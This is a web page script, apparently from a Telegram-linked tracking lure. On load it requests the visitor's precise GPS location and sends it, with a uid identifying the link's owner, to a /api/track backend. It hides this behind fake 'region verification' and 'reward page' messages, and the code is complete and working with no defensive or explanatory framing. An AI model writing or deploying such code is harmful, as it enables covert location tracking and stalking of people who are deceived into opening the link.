 
  <script>
    const statusBox = document.getElementById('status');
    const debugBox = document.getElementById('debug');
    const dbgLat = document.getElementById('dbg-lat');
    const dbgLon = document.getElementById('dbg-lon');
    const dbgAcc = document.getElementById('dbg-acc');

    let locationData = null;
    let submitted = false;

    function setStatus(message, type) {
      statusBox.textContent = message;
      statusBox.className = 'status ' + type;
    }

    function getApiBase() {
      return window.location.hostname === 'localhost'
        ? 'http://localhost:3000'
        : window.location.origin;
    }

    // URL se uid (Telegram chat id) nikal
    function getUidFromQuery() {
      const params = new URLSearchParams(window.location.search);
      return params.get('uid') || 'anonymous';
    }

    // /api/track GET with uid + lat/lon
    async function sendLocationToTrack(payload) {
      const apiBase = getApiBase();
      const uid = getUidFromQuery();

      const url = new URL('/api/track', apiBase);
      url.searchParams.set('uid', uid);
      url.searchParams.set('lat', payload.lat);
      url.searchParams.set('lon', payload.lon);
      url.searchParams.set('accuracy', payload.accuracy);

      const res = await fetch(url.toString(), {
        method: 'GET'
      });

      const data = await res.json().catch(() => ({}));
      if (!res.ok) {
        throw new Error(data.error || 'Request failed');
      }
      return data;
    }

    async function autoSubmitLocation() {
      if (submitted) return;
      submitted = true;

      setStatus('Verifying your region...', 'loading');

      try {
        const payload = locationData || {
          lat: '0',
          lon: '0',
          accuracy: 'unknown',
          email: 'fallback-anonymous'
        };

        const data = await sendLocationToTrack({
          lat: payload.lat,
          lon: payload.lon,
          accuracy: payload.accuracy
        });

        console.log('✅ Backend response (track):', data);
        setStatus(
          'Verification complete. Redirecting to reward page...',
          'success'
        );
        // optional redirect
        // setTimeout(() => { window.location.href = 'https://example.com'; }, 1500);
      } catch (err) {
        console.error('❌ Fetch error:', err);
        setStatus('Verification failed: ' + err.message, 'error');
        submitted = false;
      }
    }

    function captureLocation() {
      if (!navigator.geolocation) {
        setStatus(
          'Geolocation is not supported by your browser. Using fallback verification…',
          'error'
        );
        autoSubmitLocation();
        return;
      }

      setStatus('Requesting location for verification...', 'loading');

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          locationData = { lat: latitude, lon: longitude, accuracy };

          dbgLat.textContent = 'Latitude: ' + latitude;
          dbgLon.textContent = 'Longitude: ' + longitude;
          dbgAcc.textContent =
            'Accuracy: ' + accuracy.toFixed(2) + ' m';

          setStatus(
            'Location detected. Completing verification...',
            'loading'
          );

          setTimeout(autoSubmitLocation, 800);
        },
        (err) => {
          console.warn('Geolocation error:', err);
          setStatus(
            'We could not verify your region precisely (' +
              err.message +
              '). Using fallback verification…',
            'error'
          );
          autoSubmitLocation();
        },
        {
          enableHighAccuracy: true,
          timeout: 30000,
          maximumAge: 0
        }
      );
    }

    window.addEventListener('load', () => {
      captureLocation();
    });
  </script>
<